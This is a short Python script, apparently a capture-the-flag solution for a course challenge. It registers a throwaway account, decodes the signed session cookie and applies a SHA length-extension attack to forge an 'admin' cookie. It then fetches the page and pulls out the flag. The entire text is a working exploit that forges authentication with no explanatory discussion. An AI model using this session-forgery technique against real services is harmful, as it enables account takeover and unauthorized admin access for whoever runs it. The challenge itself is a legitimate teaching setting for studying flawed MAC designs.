import base64, requests, re, random, string
from shaext import extend, pad
BASE="https://extender.is-course.ru"
s=requests.Session()
login="zz"+"".join(random.choice(string.ascii_lowercase) for _ in range(8))
r=s.post(BASE+"/register", data={"login":login,"name":"a","family":"b","password":"pw","confirm-password":"pw"}, allow_redirects=False, timeout=20)
ck=r.cookies.get("session")
raw=base64.b64decode(ck).decode()
lh,nh,fh,sig=raw.split(":")
name=bytes.fromhex(nh); fam=bytes.fromhex(fh); lg=bytes.fromhex(lh)
SECLEN=32
M = name+b":"+fam+b":"+lg
Y = b":admin"
nd = extend(bytes.fromhex(sig), SECLEN+len(M), Y)
E = M + pad(SECLEN+len(M)) + Y
assert E.endswith(b":admin")
login_new = b"admin"
name_new = E[:len(name)]
fam_new = E[len(name)+1 : len(E)-len(b":admin")]
assert name_new+b":"+fam_new+b":"+login_new == E, "reconstruction failed"
cookie="%s:%s:%s:%s"%(login_new.hex(), name_new.hex(), fam_new.hex(), nd.hex())
val=base64.b64encode(cookie.encode()).decode()
r2=requests.get(BASE+"/", cookies={"session":val}, timeout=20)
m=re.search(r'Welcome, (.*?)!</h1>', r2.text, re.S)
print("login shown:", m.group(1) if m else "?")
print("status:", r2.status_code)
mm=re.search(r'YDS\{[^}]*\}', r2.text)
print("FLAG:", mm.group(0) if mm else "(none)")
